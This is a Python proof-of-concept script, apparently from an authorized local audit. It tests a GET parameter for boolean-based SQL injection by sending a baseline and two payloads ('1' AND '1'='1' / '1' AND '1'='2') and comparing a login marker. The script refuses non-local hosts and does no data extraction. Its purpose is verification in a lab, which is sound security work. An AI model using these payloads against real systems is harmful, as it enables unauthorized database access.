#!/usr/bin/env python3
# SQLI-001 POC draft: boolean differential on the GET parameter "id".
# Local authorized lab only. Three GET requests; no enumeration, no UNION
# extraction, no writes; redirects are never followed.
import argparse
import hashlib
import sys
import urllib.error
import urllib.parse
import urllib.request

ALLOWED_HOSTS = {"localhost", "127.0.0.1", "::1"}
LOGIN_MARKER = "Your Login name:"


class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None


def validate(url):
    parts = urllib.parse.urlsplit(url)
    if parts.scheme not in ("http", "https"):
        sys.exit("[!] unsupported scheme: %r (http/https only)" % parts.scheme)
    host = (parts.hostname or "").lower()
    if host not in ALLOWED_HOSTS:
        sys.exit("[!] host %r is not local; allowed: %s" % (host, sorted(ALLOWED_HOSTS)))


def request(url, timeout, cookie):
    validate(url)
    req = urllib.request.Request(url, method="GET")
    req.add_header("User-Agent", "sqli-001-static-poc/1.0")
    if cookie:
        req.add_header("Cookie", cookie)
    opener = urllib.request.build_opener(NoRedirect())
    try:
        with opener.open(req, timeout=timeout) as resp:
            raw = resp.read(200000)
            return resp.status, raw.decode("utf-8", "replace")
    except urllib.error.HTTPError as exc:
        raw = exc.read(200000)
        return exc.code, raw.decode("utf-8", "replace")
    except urllib.error.URLError as exc:
        sys.exit("[!] connection failed: %s" % exc.reason)
    except TimeoutError:
        sys.exit("[!] timeout after %ss" % timeout)


def probe(base, path, param, value, timeout, cookie):
    query = urllib.parse.urlencode({param: value})
    url = "%s%s%s%s" % (base.rstrip("/"), path, "&" if "?" in path else "?", query)
    print("[*] GET %s (param %s = %r)" % (path, param, value))
    status, body = request(url, timeout, cookie)
    digest = hashlib.sha256(body.encode("utf-8", "replace")).hexdigest()[:16]
    print("    status=%s len=%d sha256=%s marker=%s"
          % (status, len(body), digest, LOGIN_MARKER in body))
    return status, body, LOGIN_MARKER in body


def main():
    ap = argparse.ArgumentParser(description="SQLI-001 local boolean differential (draft)")
    ap.add_argument("--base-url", required=True, help="e.g. http://127.0.0.1:8080")
    ap.add_argument("--path", required=True,
                    help="request path of the audited script, e.g. /sqli/lesson-1/index.php")
    ap.add_argument("--param", default="id", help="GET parameter name taken from the code (default: id)")
    ap.add_argument("--baseline", default="1", help="normal value (default: 1)")
    ap.add_argument("--timeout", type=float, default=10.0)
    ap.add_argument("--session-file", default=None,
                    help="optional local file holding a Cookie header; never committed")
    args = ap.parse_args()

    if not args.path.startswith("/"):
        sys.exit("[!] --path must start with '/'")

    cookie = None
    if args.session_file:
        try:
            with open(args.session_file, "r", encoding="utf-8") as fh:
                cookie = fh.read().strip() or None
        except OSError as exc:
            sys.exit("[!] cannot read session file: %s" % exc)

    true_payload = args.baseline + "' AND '1'='1"
    false_payload = args.baseline + "' AND '1'='2"

    status, body, marker = probe(args.base_url, args.path, args.param,
                                 args.baseline, args.timeout, cookie)
    if 300 <= status < 400:
        sys.exit("[!] redirect (status %s): authentication/session not established, stop" % status)
    if not marker:
        sys.exit("[!] baseline lacks %r: wrong path/param or unauthenticated; adapt manually"
                 % LOGIN_MARKER)

    s1, b1, m1 = probe(args.base_url, args.path, args.param, true_payload, args.timeout, cookie)
    s2, b2, m2 = probe(args.base_url, args.path, args.param, false_payload, args.timeout, cookie)

    print("")
    print("[=] true-branch  marker=%s (expected True: query still selects the row)" % m1)
    print("[=] false-branch marker=%s (expected False if the quote escaped the string)" % m2)
    if s1 == 200 and s2 == 200 and m1 and not m2:
        print("[+] differential observed: the parameter changes a WHERE truth value")
        print("[!] one local observation is not full proof; keep the raw requests and responses")
        return 0
    print("[-] no clean differential: possible escaping/filtering, another SQL shape, or auth change")
    return 1


if __name__ == "__main__":
    sys.exit(main())
